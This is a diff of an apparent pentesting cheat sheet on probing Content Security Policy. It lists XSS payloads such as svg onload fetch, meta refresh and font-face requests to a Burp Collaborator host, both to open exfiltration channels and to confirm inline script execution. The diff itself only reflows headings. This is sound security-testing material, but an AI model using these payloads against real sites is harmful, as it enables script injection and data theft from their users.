@@ -37,16 +37,16 @@ Then probe for specific CSP directives:
 | `"><video src=burpcollab>`                | `media-src`             |
 | `"><iframe src=burpcollab>`               | `frame-src`             |
 | `"><object data=burpcollab>`              | `object-src`            |
-Establish exfiltration channel:
 
+Establish exfiltration channel:
 | HTML Payload                                                                                             | Corresponding directive |
 | -------------------------------------------------------------------------------------------------------- | ----------------------- |
 | `"><meta http-equiv="refresh" content="0;url=burpcollab">`                                               | `navigate-to`           |
 | `"><svg onload=fetch('//burpcollab/',{mode:'no-cors'})>`                                                 | `connect-src`           |
 | `"><style>@font-face{font-family:'x';src: url('//burpcollab/');}body{font-family:'x'!important}</style>` | `font-src`              |
 | `"><link rel=dns-prefetch href=burpcollab>`                                                              | none                    |
-Confirm inline JS execution rather than just cross-site request. To do so, first select the most permisive directive, chose an HTML tag which falls under it, then execute code in an attribute to make a request under that directive:
 
+Confirm inline JS execution rather than just cross-site request. To do so, first select the most permisive directive, chose an HTML tag which falls under it, then execute code in an attribute to make a request under that directive:
 | JS Payload                                                                                                           | Tag                         |
 | -------------------------------------------------------------------------------------------------------------------- | --------------------------- |
 | `new Image().src='//burpcollab/'`                                                                                    | `<img>`                     |
